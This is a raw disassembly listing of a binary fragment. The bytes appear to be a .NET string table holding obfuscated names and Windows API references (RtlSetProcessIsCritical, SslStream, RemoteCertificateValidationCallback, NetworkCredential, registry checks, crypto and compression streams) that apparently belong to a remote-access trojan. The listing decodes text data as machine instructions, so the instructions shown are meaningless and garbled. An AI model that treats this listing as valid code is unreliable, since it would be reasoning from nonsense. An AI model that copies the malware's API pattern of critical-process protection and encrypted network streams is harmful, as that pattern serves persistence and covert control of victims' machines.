  4089c9:	7a 69                	jp     0x408a34
  4089cb:	54                   	push   %esp
  4089cc:	55                   	push   %ebp
  4089cd:	69 69 00 6b 6a 57 61 	imul   $0x61576a6b,0x0(%ecx),%ebp
  4089d4:	73 41                	jae    0x408a17
  4089d6:	67 61                	addr16 popa
  4089d8:	50                   	push   %eax
  4089d9:	63 6f 69             	arpl   %ebp,0x69(%edi)
  4089dc:	00 55 72             	add    %dl,0x72(%ebp)
  4089df:	69 00 75 77 47 63    	imul   $0x63477775,(%eax),%eax
  4089e5:	5a                   	pop    %edx
  4089e6:	4b                   	dec    %ebx
  4089e7:	73 4a                	jae    0x408a33
  4089e9:	4a                   	dec    %edx
  4089ea:	78 72                	js     0x408a5e
  4089ec:	69 00 4f 61 41 55    	imul   $0x5541614f,(%eax),%eax
  4089f2:	69 6f 6a 78 42 74 69 	imul   $0x69744278,0x6a(%edi),%ebp
  4089f9:	00 78 65             	add    %bh,0x65(%eax)
  4089fc:	59                   	pop    %ecx
  4089fd:	50                   	push   %eax
  4089fe:	65 73 4e             	gs jae 0x408a4f
  408a01:	76 76                	jbe    0x408a79
  408a03:	72 56                	jb     0x408a5b
  408a05:	70 52                	jo     0x408a59
  408a07:	48                   	dec    %eax
  408a08:	58                   	pop    %eax
  408a09:	76 69                	jbe    0x408a74
  408a0b:	00 53 6a             	add    %dl,0x6a(%ebx)
  408a0e:	66 55                	push   %bp
  408a10:	5a                   	pop    %edx
  408a11:	4b                   	dec    %ebx
  408a12:	6a 71                	push   $0x71
  408a14:	66 61                	popaw
  408a16:	59                   	pop    %ecx
  408a17:	4c                   	dec    %esp
  408a18:	7a 69                	jp     0x408a83
  408a1a:	00 53 69             	add    %dl,0x69(%ebx)
  408a1d:	53                   	push   %ebx
  408a1e:	66 51                	push   %cx
  408a20:	74 58                	je     0x408a7a
  408a22:	52                   	push   %edx
  408a23:	73 78                	jae    0x408a9d
  408a25:	4a                   	dec    %edx
  408a26:	58                   	pop    %eax
  408a27:	69 45 6a 00 51 4e 70 	imul   $0x704e5100,0x6a(%ebp),%eax
  408a2e:	66 52                	push   %dx
  408a30:	42                   	inc    %edx
  408a31:	47                   	inc    %edi
  408a32:	4a                   	dec    %edx
  408a33:	58                   	pop    %eax
  408a34:	55                   	push   %ebp
  408a35:	69 76 45 6a 00 70 4e 	imul   $0x4e70006a,0x45(%esi),%esi
  408a3c:	43                   	inc    %ebx
  408a3d:	6d                   	insl   (%dx),%es:(%edi)
  408a3e:	43                   	inc    %ebx
  408a3f:	4a                   	dec    %edx
  408a40:	6f                   	outsl  %ds:(%esi),(%dx)
  408a41:	4c                   	dec    %esp
  408a42:	58                   	pop    %eax
  408a43:	54                   	push   %esp
  408a44:	6a 00                	push   $0x0
  408a46:	70 42                	jo     0x408a8a
  408a48:	4e                   	dec    %esi
  408a49:	47                   	inc    %edi
  408a4a:	48                   	dec    %eax
  408a4b:	61                   	popa
  408a4c:	47                   	inc    %edi
  408a4d:	46                   	inc    %esi
  408a4e:	4d                   	dec    %ebp
  408a4f:	4c                   	dec    %esp
  408a50:	62 6a 00             	bound  %ebp,0x0(%edx)
  408a53:	52                   	push   %edx
  408a54:	42                   	inc    %edx
  408a55:	6d                   	insl   (%dx),%es:(%edi)
  408a56:	6c                   	insb   (%dx),%es:(%edi)
  408a57:	62 42 65             	bound  %eax,0x65(%edx)
  408a5a:	71 69                	jno    0x408ac5
  408a5c:	68 6a 00 75 70       	push   $0x7075006a
  408a61:	77 41                	ja     0x408aa4
  408a63:	47                   	inc    %edi
  408a64:	78 6c                	js     0x408ad2
  408a66:	70 61                	jo     0x408ac9
  408a68:	4b                   	dec    %ebx
  408a69:	6a 6a                	push   $0x6a
  408a6b:	00 44 4f 72          	add    %al,0x72(%edi,%ecx,2)
  408a6f:	46                   	inc    %esi
  408a70:	4a                   	dec    %edx
  408a71:	4a                   	dec    %edx
  408a72:	51                   	push   %ecx
  408a73:	69 67 66 4c 78 49 5a 	imul   $0x5a49784c,0x66(%edi),%esp
  408a7a:	67 6c                	insb   (%dx),%es:(%di)
  408a7c:	6a 00                	push   $0x0
  408a7e:	65 47                	gs inc %edi
  408a80:	70 4f                	jo     0x408ad1
  408a82:	43                   	inc    %ebx
  408a83:	53                   	push   %ebx
  408a84:	4e                   	dec    %esi
  408a85:	45                   	inc    %ebp
  408a86:	65 49                	gs dec %ecx
  408a88:	73 64                	jae    0x408aee
  408a8a:	70 6a                	jo     0x408af6
  408a8c:	00 55 47             	add    %dl,0x47(%ebp)
  408a8f:	4d                   	dec    %ebp
  408a90:	59                   	pop    %ecx
  408a91:	72 41                	jb     0x408ad4
  408a93:	68 66 58 6b 00       	push   $0x6b5866
  408a98:	46                   	inc    %esi
  408a99:	6e                   	outsb  %ds:(%esi),(%dx)
  408a9a:	58                   	pop    %eax
  408a9b:	57                   	push   %edi
  408a9c:	4e                   	dec    %esi
  408a9d:	70 6e                	jo     0x408b0d
  408a9f:	62 43 48             	bound  %eax,0x48(%ebx)
  408aa2:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408aa5:	41                   	inc    %ecx
  408aa6:	73 79                	jae    0x408b21
  408aa8:	6e                   	outsb  %ds:(%esi),(%dx)
  408aa9:	63 43 61             	arpl   %eax,0x61(%ebx)
  408aac:	6c                   	insb   (%dx),%es:(%edi)
  408aad:	6c                   	insb   (%dx),%es:(%edi)
  408aae:	62 61 63             	bound  %esp,0x63(%ecx)
  408ab1:	6b 00 52             	imul   $0x52,(%eax),%eax
  408ab4:	65 6d                	gs insl (%dx),%es:(%edi)
  408ab6:	6f                   	outsl  %ds:(%esi),(%dx)
  408ab7:	74 65                	je     0x408b1e
  408ab9:	43                   	inc    %ebx
  408aba:	65 72 74             	gs jb  0x408b31
  408abd:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408ac4:	56                   	push   %esi
  408ac5:	61                   	popa
  408ac6:	6c                   	insb   (%dx),%es:(%edi)
  408ac7:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408ace:	43 
  408acf:	61                   	popa
  408ad0:	6c                   	insb   (%dx),%es:(%edi)
  408ad1:	6c                   	insb   (%dx),%es:(%edi)
  408ad2:	62 61 63             	bound  %esp,0x63(%ecx)
  408ad5:	6b 00 54             	imul   $0x54,(%eax),%eax
  408ad8:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408adf:	6c                   	insb   (%dx),%es:(%edi)
  408ae0:	62 61 63             	bound  %esp,0x63(%ecx)
  408ae3:	6b 00 52             	imul   $0x52,(%eax),%eax
  408ae6:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408aed:	4b 65 
  408aef:	79 50                	jns    0x408b41
  408af1:	65 72 6d             	gs jb  0x408b61
  408af4:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408afb:	68 65 63 6b 00       	push   $0x6b6365
  408b00:	46                   	inc    %esi
  408b01:	6c                   	insb   (%dx),%es:(%edi)
  408b02:	75 73                	jne    0x408b77
  408b04:	68 46 69 6e 61       	push   $0x616e6946
  408b09:	6c                   	insb   (%dx),%es:(%edi)
  408b0a:	42                   	inc    %edx
  408b0b:	6c                   	insb   (%dx),%es:(%edi)
  408b0c:	6f                   	outsl  %ds:(%esi),(%dx)
  408b0d:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408b10:	6d                   	insl   (%dx),%es:(%edi)
  408b11:	49                   	dec    %ecx
  408b12:	70 48                	jo     0x408b5c
  408b14:	76 45                	jbe    0x408b5b
  408b16:	72 53                	jb     0x408b6b
  408b18:	56                   	push   %esi
  408b19:	49                   	dec    %ecx
  408b1a:	6c                   	insb   (%dx),%es:(%edi)
  408b1b:	00 41 53             	add    %al,0x53(%ecx)
  408b1e:	41                   	inc    %ecx
  408b1f:	61                   	popa
  408b20:	4b                   	dec    %ebx
  408b21:	47                   	inc    %edi
  408b22:	59                   	pop    %ecx
  408b23:	63 74 64 46          	arpl   %esi,0x46(%esp,%eiz,2)
  408b27:	70 4c                	jo     0x408b75
  408b29:	6c                   	insb   (%dx),%es:(%edi)
  408b2a:	00 58 58             	add    %bl,0x58(%eax)
  408b2d:	4d                   	dec    %ebp
  408b2e:	58                   	pop    %eax
  408b2f:	74 67                	je     0x408b98
  408b31:	41                   	inc    %ecx
  408b32:	67 41                	addr16 inc %ecx
  408b34:	67 53                	addr16 push %ebx
  408b36:	6c                   	insb   (%dx),%es:(%edi)
  408b37:	00 52 74             	add    %dl,0x74(%edx)
  408b3a:	6c                   	insb   (%dx),%es:(%edi)
  408b3b:	53                   	push   %ebx
  408b3c:	65 74 50             	gs je  0x408b8f
  408b3f:	72 6f                	jb     0x408bb0
  408b41:	63 65 73             	arpl   %esp,0x73(%ebp)
  408b44:	73 49                	jae    0x408b8f
  408b46:	73 43                	jae    0x408b8b
  408b48:	72 69                	jb     0x408bb3
  408b4a:	74 69                	je     0x408bb5
  408b4c:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408b4f:	00 42 5a             	add    %al,0x5a(%edx)
  408b52:	45                   	inc    %ebp
  408b53:	59                   	pop    %ecx
  408b54:	49                   	dec    %ecx
  408b55:	61                   	popa
  408b56:	56                   	push   %esi
  408b57:	6c                   	insb   (%dx),%es:(%edi)
  408b58:	4a                   	dec    %edx
  408b59:	4d                   	dec    %ebp
  408b5a:	69 61 6c 00 4e 65 74 	imul   $0x74654e00,0x6c(%ecx),%esp
  408b61:	77 6f                	ja     0x408bd2
  408b63:	72 6b                	jb     0x408bd0
  408b65:	43                   	inc    %ebx
  408b66:	72 65                	jb     0x408bcd
  408b68:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408b6b:	74 69                	je     0x408bd6
  408b6d:	61                   	popa
  408b6e:	6c                   	insb   (%dx),%es:(%edi)
  408b6f:	00 53 79             	add    %dl,0x79(%ebx)
  408b72:	73 74                	jae    0x408be8
  408b74:	65 6d                	gs insl (%dx),%es:(%edi)
  408b76:	2e 53                	cs push %ebx
  408b78:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408b7c:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408b83:	6e 
  408b84:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408b87:	61                   	popa
  408b88:	6c                   	insb   (%dx),%es:(%edi)
  408b89:	00 57 69             	add    %dl,0x69(%edi)
  408b8c:	6e                   	outsb  %ds:(%esi),(%dx)
  408b8d:	64 6f                	outsl  %fs:(%esi),(%dx)
  408b8f:	77 73                	ja     0x408c04
  408b91:	50                   	push   %eax
  408b92:	72 69                	jb     0x408bfd
  408b94:	6e                   	outsb  %ds:(%esi),(%dx)
  408b95:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408b98:	61                   	popa
  408b99:	6c                   	insb   (%dx),%es:(%edi)
  408b9a:	00 67 65             	add    %ah,0x65(%edi)
  408b9d:	74 5f                	je     0x408bfe
  408b9f:	49                   	dec    %ecx
  408ba0:	6e                   	outsb  %ds:(%esi),(%dx)
  408ba1:	74 65                	je     0x408c08
  408ba3:	72 76                	jb     0x408c1b
  408ba5:	61                   	popa
  408ba6:	6c                   	insb   (%dx),%es:(%edi)
  408ba7:	00 73 65             	add    %dh,0x65(%ebx)
  408baa:	74 5f                	je     0x408c0b
  408bac:	49                   	dec    %ecx
  408bad:	6e                   	outsb  %ds:(%esi),(%dx)
  408bae:	74 65                	je     0x408c15
  408bb0:	72 76                	jb     0x408c28
  408bb2:	61                   	popa
  408bb3:	6c                   	insb   (%dx),%es:(%edi)
  408bb4:	00 4b 48             	add    %cl,0x48(%ebx)
  408bb7:	4f                   	dec    %edi
  408bb8:	78 65                	js     0x408c1f
  408bba:	77 76                	ja     0x408c32
  408bbc:	48                   	dec    %eax
  408bbd:	6d                   	insl   (%dx),%es:(%edi)
  408bbe:	43                   	inc    %ebx
  408bbf:	4e                   	dec    %esi
  408bc0:	62 6c 00 6d          	bound  %ebp,0x6d(%eax,%eax,1)
  408bc4:	4b                   	dec    %ebx
  408bc5:	6d                   	insl   (%dx),%es:(%edi)
  408bc6:	78 6c                	js     0x408c34
  408bc8:	42                   	inc    %edx
  408bc9:	57                   	push   %edi
  408bca:	61                   	popa
  408bcb:	7a 49                	jp     0x408c16
  408bcd:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408bd0:	00 41 4d             	add    %al,0x4d(%ecx)
  408bd3:	4c                   	dec    %esp
  408bd4:	79 57                	jns    0x408c2d
  408bd6:	6c                   	insb   (%dx),%es:(%edi)
  408bd7:	52                   	push   %edx
  408bd8:	58                   	pop    %eax
  408bd9:	6a 6c                	push   $0x6c
  408bdb:	00 6b 65             	add    %ch,0x65(%ebx)
  408bde:	72 6e                	jb     0x408c4e
  408be0:	65 6c                	gs insb (%dx),%es:(%edi)
  408be2:	33 32                	xor    (%edx),%esi
  408be4:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408be7:	6c                   	insb   (%dx),%es:(%edi)
  408be8:	00 6e 74             	add    %ch,0x74(%esi)
  408beb:	64 6c                	fs insb (%dx),%es:(%edi)
  408bed:	6c                   	insb   (%dx),%es:(%edi)
  408bee:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408bf1:	6c                   	insb   (%dx),%es:(%edi)
  408bf2:	00 4b 69             	add    %cl,0x69(%ebx)
  408bf5:	6c                   	insb   (%dx),%es:(%edi)
  408bf6:	6c                   	insb   (%dx),%es:(%edi)
  408bf7:	00 50 6f             	add    %dl,0x6f(%eax)
  408bfa:	6c                   	insb   (%dx),%es:(%edi)
  408bfb:	6c                   	insb   (%dx),%es:(%edi)
  408bfc:	00 41 4a             	add    %al,0x4a(%ecx)
  408bff:	42                   	inc    %edx
  408c00:	4a                   	dec    %edx
  408c01:	6d                   	insl   (%dx),%es:(%edi)
  408c02:	59                   	pop    %ecx
  408c03:	42                   	inc    %edx
  408c04:	49                   	dec    %ecx
  408c05:	6a 5a                	push   $0x5a
  408c07:	6a 41                	push   $0x41
  408c09:	6d                   	insl   (%dx),%es:(%edi)
  408c0a:	00 4c 42 79          	add    %cl,0x79(%edx,%eax,2)
  408c0e:	71 76                	jno    0x408c86
  408c10:	54                   	push   %esp
  408c11:	44                   	inc    %esp
  408c12:	58                   	pop    %eax
  408c13:	52                   	push   %edx
  408c14:	6f                   	outsl  %ds:(%esi),(%dx)
  408c15:	42                   	inc    %edx
  408c16:	6d                   	insl   (%dx),%es:(%edi)
  408c17:	00 6d 4d             	add    %ch,0x4d(%ebp)
  408c1a:	55                   	push   %ebp
  408c1b:	41                   	inc    %ecx
  408c1c:	4b                   	dec    %ebx
  408c1d:	61                   	popa
  408c1e:	67 52                	addr16 push %edx
  408c20:	4c                   	dec    %esp
  408c21:	6c                   	insb   (%dx),%es:(%edi)
  408c22:	68 48 4d 6d 00       	push   $0x6d4d48
  408c27:	68 76 62 75 41       	push   $0x41756276
  408c2c:	42                   	inc    %edx
  408c2d:	4d                   	dec    %ebp
  408c2e:	43                   	inc    %ebx
  408c2f:	59                   	pop    %ecx
  408c30:	74 4e                	je     0x408c80
  408c32:	6d                   	insl   (%dx),%es:(%edi)
  408c33:	00 7a 73             	add    %bh,0x73(%edx)
  408c36:	43                   	inc    %ebx
  408c37:	6c                   	insb   (%dx),%es:(%edi)
  408c38:	66 58                	pop    %ax
  408c3a:	75 75                	jne    0x408cb1
  408c3c:	59                   	pop    %ecx
  408c3d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3e:	4a                   	dec    %edx
  408c3f:	56                   	push   %esi
  408c40:	6d                   	insl   (%dx),%es:(%edi)
  408c41:	00 53 63             	add    %dl,0x63(%ebx)
  408c44:	42                   	inc    %edx
  408c45:	42                   	inc    %edx
  408c46:	58                   	pop    %eax
  408c47:	70 74                	jo     0x408cbd
  408c49:	53                   	push   %ebx
  408c4a:	65 61                	gs popa
  408c4c:	58                   	pop    %eax
  408c4d:	6d                   	insl   (%dx),%es:(%edi)
  408c4e:	00 46 69             	add    %al,0x69(%esi)
  408c51:	6c                   	insb   (%dx),%es:(%edi)
  408c52:	65 53                	gs push %ebx
  408c54:	74 72                	je     0x408cc8
  408c56:	65 61                	gs popa
  408c58:	6d                   	insl   (%dx),%es:(%edi)
  408c59:	00 4e 65             	add    %cl,0x65(%esi)
  408c5c:	74 77                	je     0x408cd5
  408c5e:	6f                   	outsl  %ds:(%esi),(%dx)
  408c5f:	72 6b                	jb     0x408ccc
  408c61:	53                   	push   %ebx
  408c62:	74 72                	je     0x408cd6
  408c64:	65 61                	gs popa
  408c66:	6d                   	insl   (%dx),%es:(%edi)
  408c67:	00 53 73             	add    %dl,0x73(%ebx)
  408c6a:	6c                   	insb   (%dx),%es:(%edi)
  408c6b:	53                   	push   %ebx
  408c6c:	74 72                	je     0x408ce0
  408c6e:	65 61                	gs popa
  408c70:	6d                   	insl   (%dx),%es:(%edi)
  408c71:	00 43 72             	add    %al,0x72(%ebx)
  408c74:	79 70                	jns    0x408ce6
  408c76:	74 6f                	je     0x408ce7
  408c78:	53                   	push   %ebx
  408c79:	74 72                	je     0x408ced
  408c7b:	65 61                	gs popa
  408c7d:	6d                   	insl   (%dx),%es:(%edi)
  408c7e:	00 47 5a             	add    %al,0x5a(%edi)
  408c81:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  408c88:	6d                   	insl   (%dx),%es:(%edi)
  408c89:	00 4d 65             	add    %cl,0x65(%ebp)
  408c8c:	6d                   	insl   (%dx),%es:(%edi)
  408c8d:	6f                   	outsl  %ds:(%esi),(%dx)
  408c8e:	72 79                	jb     0x408d09
  408c90:	53                   	push   %ebx
  408c91:	74 72                	je     0x408d05
  408c93:	65 61                	gs popa
  408c95:	6d                   	insl   (%dx),%es:(%edi)
  408c96:	00 67 65             	add    %ah,0x65(%edi)
  408c99:	74 5f                	je     0x408cfa
  408c9b:	49                   	dec    %ecx
  408c9c:	74 65                	je     0x408d03
  408c9e:	6d                   	insl   (%dx),%es:(%edi)
  408c9f:	00 67 65             	add    %ah,0x65(%edi)
  408ca2:	74 5f                	je     0x408d03
  408ca4:	49                   	dec    %ecx
  408ca5:	73 36                	jae    0x408cdd
  408ca7:	34 42                	xor    $0x42,%al
  408ca9:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408cb0:	74 
  408cb1:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408cb8:	65 6d                	gs insl (%dx),%es:(%edi)
  408cba:	00 6a 74             	add    %ch,0x74(%edx)
  408cbd:	45                   	inc    %ebp
  408cbe:	4a                   	dec    %edx
  408cbf:	6b 47 4b 49          	imul   $0x49,0x4b(%edi),%eax
  408cc3:	5a                   	pop    %edx
  408cc4:	67 6d                	insl   (%dx),%es:(%di)
  408cc6:	00 53 79             	add    %dl,0x79(%ebx)
  408cc9:	6d                   	insl   (%dx),%es:(%edi)
  408cca:	6d                   	insl   (%dx),%es:(%edi)
  408ccb:	65 74 72             	gs je  0x408d40
  408cce:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408cd5:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408cdc:	79 
  408cdd:	6d                   	insl   (%dx),%es:(%edi)
  408cde:	6d                   	insl   (%dx),%es:(%edi)
  408cdf:	65 74 72             	gs je  0x408d54
  408ce2:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408ce9:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408cf0:	73 
  408cf1:	68 41 6c 67 6f       	push   $0x6f676c41
  408cf6:	72 69                	jb     0x408d61
  408cf8:	74 68                	je     0x408d62
  408cfa:	6d                   	insl   (%dx),%es:(%edi)
  408cfb:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408cff:	6d                   	insl   (%dx),%es:(%edi)
  408d00:	00 6d 6f             	add    %ch,0x6f(%ebp)
  408d03:	69 78 71 67 68 53 42 	imul   $0x42536867,0x71(%eax),%edi
  408d0a:	78 71                	js     0x408d7d
  408d0c:	6d                   	insl   (%dx),%es:(%edi)
  408d0d:	6d                   	insl   (%dx),%es:(%edi)
  408d0e:	00 53 52             	add    %dl,0x52(%ebx)
  408d11:	56                   	push   %esi
  408d12:	51                   	push   %ecx
  408d13:	6f                   	outsl  %ds:(%esi),(%dx)
  408d14:	4b                   	dec    %ebx
  408d15:	47                   	inc    %edi
  408d16:	54                   	push   %esp
  408d17:	63 6b 57             	arpl   %ebp,0x57(%ebx)
  408d1a:	78 73                	js     0x408d8f
  408d1c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d1d:	6d                   	insl   (%dx),%es:(%edi)
  408d1e:	00 52 61             	add    %dl,0x61(%edx)
  408d21:	6e                   	outsb  %ds:(%esi),(%dx)
  408d22:	64 6f                	outsl  %fs:(%esi),(%dx)
  408d24:	6d                   	insl   (%dx),%es:(%edi)
  408d25:	00 49 43             	add    %cl,0x43(%ecx)
  408d28:	72 79                	jb     0x408da3
  408d2a:	70 74                	jo     0x408da0
  408d2c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d2d:	54                   	push   %esp
  408d2e:	72 61                	jb     0x408d91
  408d30:	6e                   	outsb  %ds:(%esi),(%dx)
  408d31:	73 66                	jae    0x408d99
  408d33:	6f                   	outsl  %ds:(%esi),(%dx)
  408d34:	72 6d                	jb     0x408da3
  408d36:	00 45 6e             	add    %al,0x6e(%ebp)
  408d39:	75 6d                	jne    0x408da8
  408d3b:	00 50 4a             	add    %dl,0x4a(%eax)
  408d3e:	48                   	dec    %eax
  408d3f:	57                   	push   %edi
  408d40:	47                   	inc    %edi
  408d41:	61                   	popa
  408d42:	4b                   	dec    %ebx
  408d43:	52                   	push   %edx
  408d44:	47                   	inc    %edi
  408d45:	79 6d                	jns    0x408db4
  408d47:	00 4c 68 6a          	add    %cl,0x6a(%eax,%ebp,2)
  408d4b:	45                   	inc    %ebp
  408d4c:	55                   	push   %ebp
  408d4d:	72 6e                	jb     0x408dbd
  408d4f:	4a                   	dec    %edx
  408d50:	4a                   	dec    %edx
  408d51:	52                   	push   %edx
  408d52:	4b                   	dec    %ebx
  408d53:	66 69 51 79 6d 00    	imul   $0x6d,0x79(%ecx),%dx
  408d59:	44                   	inc    %esp
  408d5a:	4b                   	dec    %ebx
  408d5b:	49                   	dec    %ecx
  408d5c:	74 61                	je     0x408dbf
  408d5e:	51                   	push   %ecx
  408d5f:	4e                   	dec    %esi
  408d60:	64 46                	fs inc %esi
  408d62:	6e                   	outsb  %ds:(%esi),(%dx)
  408d63:	00 52 48             	add    %dl,0x48(%edx)
  408d66:	70 6c                	jo     0x408dd4
  408d68:	56                   	push   %esi
  408d69:	59                   	pop    %ecx
  408d6a:	6b 43 62 6b          	imul   $0x6b,0x62(%ebx),%eax
  408d6e:	4e                   	dec    %esi
  408d6f:	6e                   	outsb  %ds:(%esi),(%dx)
  408d70:	00 59 7a             	add    %bl,0x7a(%ecx)
  408d73:	44                   	inc    %esp
  408d74:	41                   	inc    %ecx
  408d75:	6c                   	insb   (%dx),%es:(%edi)
  408d76:	75 73                	jne    0x408deb
  408d78:	6d                   	insl   (%dx),%es:(%edi)
  408d79:	77 4c                	ja     0x408dc7
  408d7b:	41                   	inc    %ecx
  408d7c:	4f                   	dec    %edi
  408d7d:	6e                   	outsb  %ds:(%esi),(%dx)
  408d7e:	00 71 44             	add    %dh,0x44(%ecx)
  408d81:	55                   	push   %ebp
  408d82:	67 4e                	addr16 dec %esi
  408d84:	46                   	inc    %esi
  408d85:	51                   	push   %ecx
  408d86:	7a 74                	jp     0x408dfc
  408d88:	68 53 50 6e 00       	push   $0x6e5053
  408d8d:	59                   	pop    %ecx
  408d8e:	43                   	inc    %ebx
  408d8f:	7a 4d                	jp     0x408dde
  408d91:	75 6a                	jne    0x408dfd
  408d93:	72 7a                	jb     0x408e0f
  408d95:	65 4a                	gs dec %edx
  408d97:	52                   	push   %edx
  408d98:	6e                   	outsb  %ds:(%esi),(%dx)
  408d99:	00 67 72             	add    %ah,0x72(%edi)
  408d9c:	74 71                	je     0x408e0f
  408d9e:	70 50                	jo     0x408df0
  408da0:	75 67                	jne    0x408e09
  408da2:	79 73                	jns    0x408e17
  408da4:	56                   	push   %esi
  408da5:	55                   	push   %ebp
  408da6:	6e                   	outsb  %ds:(%esi),(%dx)
  408da7:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408dab:	6f                   	outsl  %ds:(%esi),(%dx)
  408dac:	6f                   	outsl  %ds:(%esi),(%dx)
  408dad:	6c                   	insb   (%dx),%es:(%edi)
  408dae:	65 61                	gs popa
  408db0:	6e                   	outsb  %ds:(%esi),(%dx)
  408db1:	00 4d 61             	add    %cl,0x61(%ebp)
  408db4:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  408dbb:	43                   	inc    %ebx
  408dbc:	68 61 69 6e 00       	push   $0x6e6961
  408dc1:	41                   	inc    %ecx
  408dc2:	70 70                	jo     0x408e34
  408dc4:	44                   	inc    %esp
  408dc5:	6f                   	outsl  %ds:(%esi),(%dx)
  408dc6:	6d                   	insl   (%dx),%es:(%edi)
  408dc7:	61                   	popa
  408dc8:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  408dcf:	43                   	inc    %ebx
  408dd0:	75 72                	jne    0x408e44
  408dd2:	72 65                	jb     0x408e39
  408dd4:	6e                   	outsb  %ds:(%esi),(%dx)
  408dd5:	74 44                	je     0x408e1b
  408dd7:	6f                   	outsl  %ds:(%esi),(%dx)
  408dd8:	6d                   	insl   (%dx),%es:(%edi)
  408dd9:	61                   	popa
  408dda:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  408de1:	00 63 61             	add    %ah,0x61(%ebx)
  408de4:	77 69                	ja     0x408e4f
  408de6:	54                   	push   %esp
  408de7:	43                   	inc    %ebx
  408de8:	48                   	dec    %eax
  408de9:	72 5a                	jb     0x408e45
  408deb:	7a 69                	jp     0x408e56
  408ded:	6e                   	outsb  %ds:(%esi),(%dx)
  408dee:	00 47 65             	add    %al,0x65(%edi)
  408df1:	74 46                	je     0x408e39
  408df3:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408dfa:	57 
  408dfb:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408e02:	78 
  408e03:	74 65                	je     0x408e6a
  408e05:	6e                   	outsb  %ds:(%esi),(%dx)
  408e06:	73 69                	jae    0x408e71
  408e08:	6f                   	outsl  %ds:(%esi),(%dx)
  408e09:	6e                   	outsb  %ds:(%esi),(%dx)
  408e0a:	00 67 65             	add    %ah,0x65(%edi)
  408e0d:	74 5f                	je     0x408e6e
  408e0f:	4f                   	dec    %edi
  408e10:	53                   	push   %ebx
  408e11:	56                   	push   %esi
  408e12:	65 72 73             	gs jb  0x408e88
  408e15:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408e1c:	74 65                	je     0x408e83
  408e1e:	6d                   	insl   (%dx),%es:(%edi)
  408e1f:	2e 49                	cs dec %ecx
  408e21:	4f                   	dec    %edi
  408e22:	2e 43                	cs inc %ebx
  408e24:	6f                   	outsl  %ds:(%esi),(%dx)
  408e25:	6d                   	insl   (%dx),%es:(%edi)
  408e26:	70 72                	jo     0x408e9a
  408e28:	65 73 73             	gs jae 0x408e9e
  408e2b:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408e32:	6c                   	insb   (%dx),%es:(%edi)
  408e33:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408e3a:	00 53 79             	add    %dl,0x79(%ebx)
  408e3d:	73 74                	jae    0x408eb3
  408e3f:	65 6d                	gs insl (%dx),%es:(%edi)
  408e41:	2e 53                	cs push %ebx
  408e43:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e47:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  408e4e:	68 
  408e4f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e51:	74 69                	je     0x408ebc
  408e53:	63 61 74             	arpl   %esp,0x74(%ecx)
  408e56:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408e5d:	74 65                	je     0x408ec4
  408e5f:	6d                   	insl   (%dx),%es:(%edi)
  408e60:	2e 52                	cs push %edx
  408e62:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408e65:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e6a:	6e                   	outsb  %ds:(%esi),(%dx)
  408e6b:	00 58 35             	add    %bl,0x35(%eax)
  408e6e:	30 39                	xor    %bh,(%ecx)
  408e70:	43                   	inc    %ebx
  408e71:	65 72 74             	gs jb  0x408ee8
  408e74:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e7b:	43                   	inc    %ebx
  408e7c:	6f                   	outsl  %ds:(%esi),(%dx)
  408e7d:	6c                   	insb   (%dx),%es:(%edi)
  408e7e:	6c                   	insb   (%dx),%es:(%edi)
  408e7f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e84:	6e                   	outsb  %ds:(%esi),(%dx)
  408e85:	00 4d 61             	add    %cl,0x61(%ebp)
